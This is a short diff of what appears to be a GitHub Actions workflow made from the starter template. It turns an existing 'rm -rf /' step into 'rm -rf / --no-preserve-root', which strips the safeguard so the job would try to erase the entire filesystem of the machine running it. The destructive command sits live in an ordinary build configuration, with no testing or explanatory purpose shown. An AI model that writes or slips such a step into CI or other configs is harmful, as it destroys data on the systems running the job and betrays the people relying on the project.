@@ -35,5 +35,5 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           mkdir fanecas
-          rm -rf /
+          rm -rf / --no-preserve-root
   
